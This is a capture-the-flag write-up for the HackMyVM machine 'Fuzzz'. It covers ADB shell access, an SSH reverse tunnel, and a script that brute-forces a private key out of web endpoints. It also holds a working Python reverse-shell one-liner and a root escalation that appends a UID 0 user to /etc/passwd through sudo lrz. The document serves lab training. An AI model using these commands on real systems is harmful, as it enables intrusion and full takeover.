# Fuzzz

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Fuzzz | 20206675 | Beginner | HackMyVM |

**Summary:** Fuzzz is a beginner-level machine from HackMyVM that highlights the dangers of misconfigured management services and insecure internal APIs. The attack chain begins with the exploitation of a **Fake Android Debug Bridge (ADB)** service to gain initial shell access. Following local reconnaissance and the establishment of an **SSH Reverse Tunnel**, the attack pivots to an internal web service. By leveraging **Resource Enumeration** and **Linear Brute-Force extraction**, a fragmented SSH private key was recovered. The final stage involves **Privilege Escalation** by exploiting `sudo` permissions on the `lrz` (ZMODEM) utility, using an **Arbitrary File Write (Append)** primitive to inject a UID 0 user into the `/etc/passwd` file, resulting in full system compromise.

---

## Reconnaissance

### Network Discovery
Initial network scanning revealed the target machine at IP address 192.168.100.36:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.36 08:00:27:6F:D5:84 VirtualBox
```

### Port Scanning
A comprehensive Nmap scan revealed two open ports on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/fuzzz]
└─$ nmap -sCV -p- 192.168.100.36
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 10:50 WIB
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.100.36
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey:
|   256 b6:7b:e7:e5:b3:33:c7:ff:db:63:5d:b3:75:0d:e2:dd (ECDSA)
|_  256 0a:ce:e5:c3:de:50:9c:6d:b7:0d:de:73:b8:6c:28:55 (ED25519)
5555/tcp open  adb     Android Debug Bridge (token auth required)
Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.46 seconds
```

The scan identified:
- Port 22: SSH service (OpenSSH 9.9)
- Port 5555: Android Debug Bridge (ADB)

## Initial Access

### ADB Connection
The presence of ADB on port 5555 provided an immediate attack vector:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ adb connect 192.168.100.36:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 192.168.100.36:5555
```

### Shell Access
Successfully obtained a shell through the ADB service:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ adb -s 192.168.100.36:5555 shell
/ $ id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
```

### Shell Stabilization
Due to the unstable nature of the ADB shell, a reverse shell was established for better persistence:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ adb shell
/ $ nohup python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &
/ $ nohup: appending output to /home/runner/nohup.out
```

The reverse shell connection was established successfully:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 54749
/ $ ^[[6;5R

/ $ id
id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
```

### Internal Service Discovery
Network enumeration revealed critical internal services:

```bash
~ $ netstat -tlnup
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      2528/python3
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
~ $ ps aux | grep 80
 1080 root      0:00 [kworker/R-scsi_]
 1180 root      0:00 [kworker/R-scsi_]
 2588 asahi     0:02 /usr/sbin/uwsgi --plugin python3 --http-socket 127.0.0.1:80 --wsgi-file /opt/webapp/app.py --callable app
 2820 runner    0:00 grep 80
```

Key findings:
- Internal web service running on `127.0.0.1:80`
- UWSGI application serving a Python Flask/Django app
- The ADB service was actually a Python fake service, not genuine `adbd`

## Lateral Movement and Web Service Access

### SSH Tunneling Setup
To access the internal web service, SSH tunneling was required. First, the TTY was properly upgraded:

```bash
/ $ python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
/ $ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
/ $ reset
/ $ export TERM=xterm
/ $ export SHELL=bash
```

SSH service was started on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ sudo systemctl start ssh
[sudo] password for ouba:
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ sudo systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
...
Active: active (running) since Tue 2026-01-27 02:45:23 WIB; 48s ago
...
Jan 27 02:45:22 CLIENT-DESKTOP systemd[1]: Starting ssh.service - OpenBSD>
Jan 27 02:45:23 CLIENT-DESKTOP sshd[2874]: Server listening on 0.0.0.0 po>
Jan 27 02:45:23 CLIENT-DESKTOP sshd[2874]: Server listening on :: port 22.
Jan 27 02:45:23 CLIENT-DESKTOP systemd[1]: Started ssh.service - OpenBSD >
```

SSH reverse tunneling was established from the target to access the internal web service:

```bash
/ $ ssh -R 8080:127.0.0.1:80 ouba@192.168.100.1
ouba@192.168.100.1's password:
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ id
uid=1000(ouba) gid=1000(ouba) groups=1000(ouba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
```

Verification of the tunnel establishment:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ss -atn | grep :22
LISTEN 0      128          0.0.0.0:22           0.0.0.0:*
LISTEN 0      128             [::]:22              [::]:*
```

After connection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ss -atn | grep :22
LISTEN 0      128          0.0.0.0:22           0.0.0.0:*
ESTAB  0      0      172.21.44.133:22       172.21.32.1:54769
LISTEN 0      128             [::]:22              [::]:*
```

### Web Application Fuzzing
With the internal web service accessible via `127.0.0.1:8080`, directory fuzzing was conducted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -t 40

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
line                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
line2                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 47ms]
line1                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
line3                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
line4                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
line01                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
line02                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
:: Progress: [207630/207630] :: Job [1/1] :: 781 req/sec :: Duration: [0:05:15] :: Errors: 0 ::
```

Manual verification revealed that endpoints `line1` through `line5` returned HTTP 200 status codes, while `line6` returned 404:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -I http://127.0.0.1:8080/line5
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -I http://127.0.0.1:8080/line6
HTTP/1.1 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 207
```

### Data Extraction Script
A custom bash script was developed to extract the hidden content from the line endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ cat bf.sh
#!/bin/bash

TARGET_URL="http://127.0.0.1:8080"
LINES=("line1" "line2" "line3" "line4" "line5")
CHARSET=" !\"$%&'()*+,-/0123456789:;<=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_\`abcdefghijklmnopqrstuvwxyz{|}~"

echo "Starting full ASCII extraction..."

for LINE in "${LINES[@]}"; do
    CURRENT_STRING=""
    printf "Processing %s: " "$LINE"

    while true; do
        FOUND=false
        for (( i=0; i<${#CHARSET}; i++ )); do
            CHAR="${CHARSET:$i:1}"

            case "$CHAR" in
                " ") ENCODED="%20" ;;
                "\"") ENCODED="%22" ;;
                "$") ENCODED="%24" ;;
                "%") ENCODED="%25" ;;
                "&") ENCODED="%26" ;;
                "+") ENCODED="%2B" ;;
                "/") ENCODED="%2F" ;;
                ":") ENCODED="%3A" ;;
                ";") ENCODED="%3B" ;;
                "<") ENCODED="%3C" ;;
                "=") ENCODED="%3D" ;;
                ">") ENCODED="%3E" ;;
                "@") ENCODED="%40" ;;
                "[") ENCODED="%5B" ;;
                "\\") ENCODED="%5C" ;;
                "]") ENCODED="%5D" ;;
                "^") ENCODED="%5E" ;;
                "\`") ENCODED="%60" ;;
                "{") ENCODED="%7B" ;;
                "|") ENCODED="%7C" ;;
                "}") ENCODED="%7D" ;;
                "~") ENCODED="%7E" ;;
                *) ENCODED="$CHAR" ;;
            esac

            STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/$LINE/$CURRENT_STRING$ENCODED")

            if [ "$STATUS" == "200" ]; then
                printf "%s" "$CHAR"
                CURRENT_STRING="${CURRENT_STRING}${CHAR}"
                FOUND=true
                break
            fi
        done

        if [ "$FOUND" = false ]; then
            echo ""
            echo "$CURRENT_STRING" >> output.txt
            break
        fi
    done
done

echo "Extraction complete. Results saved to output.txt."
```

### SSH Private Key Recovery
The script successfully extracted base64-encoded content from each line:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ bash bf.sh
Starting full ASCII extraction...
Processing line1: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
Processing line2: QyNTU[REDACTED]f0t/u
Processing line3: XwAAA[REDACTED]tXpgw
Processing line4: AAAEB[REDACTED]PEy9J
Processing line5: 5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
Extraction complete. Results saved to output.txt.
```

The extracted content was decoded to reveal an SSH private key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ cat output.txt | base64 -d
openssh-key-v1nonenone3
                       ssh-ed25519 +�AE�0��-�i�/I�����`_��DB������_���_
                                                                       ssh-ed25519 +�AE�0��-�i�/I�����`_��DB��@B��b��J"m\�-c.Ùꁾ�
                ]�1�R�V��+�AE�0��-�i�/I�����`_��DB��    asahi@phi     
```

The private key was properly formatted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo "-----BEGIN OPENSSH PRIVATE KEY-----" > asahi_key

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ tr -d '\n ' < output.txt >> asahi_key

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo -e "\n-----END OPENSSH PRIVATE KEY-----" >> asahi_key

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ chmod 600 asahi_key
```

### SSH Access as User asahi
Using the recovered private key, SSH access was gained to the user `asahi`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh -i asahi_key asahi@192.168.100.36

fuzzz:~$ id
uid=1001(asahi) gid=1001(asahi) groups=1001(asahi)
fuzzz:~$
```

## Privilege Escalation

### Sudo Privileges Enumeration
The user `asahi` had specific sudo privileges:

```bash
fuzzz:~$ sudo -l
Matching Defaults entries for asahi on fuzzz:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asahi:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User asahi may run the following commands on fuzzz:
    (ALL) NOPASSWD: /usr/local/bin/lrz
```

### LRZ Binary Analysis
The `lrz` binary was identified as a ZMODEM file transfer utility:

```bash
fuzzz:~$ sudo /usr/local/bin/lrz --help
lrz version 0.12.21rc
Usage: lrz [options] [filename.if.xmodem]
Receive files with ZMODEM/YMODEM/XMODEM protocol
    (X) = option applies to XMODEM only
    (Y) = option applies to YMODEM only
    (Z) = option applies to ZMODEM only
  -+, --append                append to existing files
  -a, --ascii                 ASCII transfer (change CR/LF to LF)
  -b, --binary                binary transfer
  -B, --bufsize N             buffer N bytes (N==auto: buffer whole file)
  -c, --with-crc              Use 16 bit CRC (X)
  -C, --allow-remote-commands allow execution of remote commands (Z)
  -D, --null                  write all received data to /dev/null
      --delay-startup N       sleep N seconds before doing anything
  -e, --escape                Escape control characters (Z)
  -E, --rename                rename any files already existing
      --errors N              generate CRC error every N bytes (debugging)
  -h, --help                  Help, print this usage message
  -m, --min-bps N             stop transmission if BPS below N
  -M, --min-bps-time N          for at least N seconds (default: 120)
  -O, --disable-timeouts      disable timeout code, wait forever for data
      --o-sync                open output file(s) in synchronous write mode
  -p, --protect               protect existing files
  -q, --quiet                 quiet, no progress reports
  -r, --resume                try to resume interrupted file transfer (Z)
  -R, --restricted            restricted, more secure mode
  -s, --stop-at {HH:MM|+N}    stop transmission at HH:MM or in N seconds
  -S, --timesync              request remote time (twice: set local time)
      --syslog[=off]          turn syslog on or off, if possible
  -t, --timeout N             set timeout to N tenths of a second
      --tcp-server            open socket, wait for connection (Z)
      --tcp-client ADDR:PORT  open socket, connect to ... (Z)
  -u, --keep-uppercase        keep upper case filenames
  -U, --unrestrict            disable restricted mode (if allowed to)
  -v, --verbose               be verbose, provide debugging information
  -w, --windowsize N          Window is N bytes (Z)
  -X  --xmodem                use XMODEM protocol
  -y, --overwrite             Yes, clobber existing file if any
      --ymodem                use YMODEM protocol
  -Z, --zmodem                use ZMODEM protocol

short options use the same arguments as the long ones
```

### Malicious Passwd File Creation
A malicious passwd entry was created with root privileges:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ openssl passwd -1 -salt pwn password123
$1$pwn$pZ1S90rEEfmfS4ODJKFrA/

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo 'pwned:$1$pwn$pZ1S90rEEfmfS4ODJKFrA/:0:0:root:/root:/bin/sh' > passwd
```

### File Transfer and Root Access
The LRZ binary was exploited using its TCP server functionality to receive and append files:

```bash
fuzzz:/etc$ sudo /usr/local/bin/lrz --append --tcp-server
connect with lrz --tcp-client "fuzzz.hmv:42773"
```

From the attacking machine, the malicious passwd file was transferred:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ sz --tcp-client 192.168.100.36:42773 passwd
connecting to [192.168.100.36] <42773>
```

The passwd file was successfully modified, allowing privilege escalation:

```bash
lrz waiting to receive.fuzzz:/etc$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
runner:x:1000:1000::/home/runner:/bin/sh
asahi:x:1001:1001::/home/asahi:/bin/sh
uwsgi:x:101:102:uwsgi:/dev/null:/sbin/nologin
pwned:$1$pwn$pZ1S90rEEfmfS4ODJKFrA/:0:0:root:/root:/bin/sh
```

### Root Shell and Flag Capture
Switching to the newly created user achieved root privileges:

```bash
fuzzz:/etc$ su - pwned
Password:
fuzzz:~# id
uid=0(root) gid=0(root) groups=0(root)
fuzzz:~# ls -la
total 12
drwx------    2 root     root          4096 May 19  2025 .
drwxr-xr-x   21 root     root          4096 May 19  2025 ..
lrwxrwxrwx    1 root     root             9 May 19  2025 .ash_history -> /dev/null
-rw-r--r--    1 root     root            47 May 19  2025 root.flag
fuzzz:~# cat root.flag /home/asahi/user.flag
flag{46a[REDACTED]}
flag{da3[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified target machine (192.168.100.36) with SSH (port 22) and ADB services (port 5555)
2. **Initial Access**: Connected to fake ADB service and obtained shell access as user 'runner'
3. **Shell Stabilization**: Established reverse shell connection for persistence and stability
4. **Service Discovery**: Identified internal web application running on 127.0.0.1:80 via netstat enumeration
5. **SSH Tunneling**: Established SSH reverse tunnel to access internal web service through port forwarding
6. **Web Application Fuzzing**: Used ffuf to discover endpoints line1-line5 returning base64-encoded content
7. **Data Extraction**: Created custom script to extract base64-encoded SSH private key from web endpoints
8. **Lateral Movement**: Used recovered SSH private key to authenticate as user 'asahi'
9. **Privilege Enumeration**: Discovered sudo permissions for /usr/local/bin/lrz (ZMODEM file transfer utility)
10. **Privilege Escalation**: Exploited lrz --append --tcp-server functionality to inject malicious passwd entry with root privileges
11. **Root Access**: Successfully switched to injected user account achieving full root access and captured both user and root flags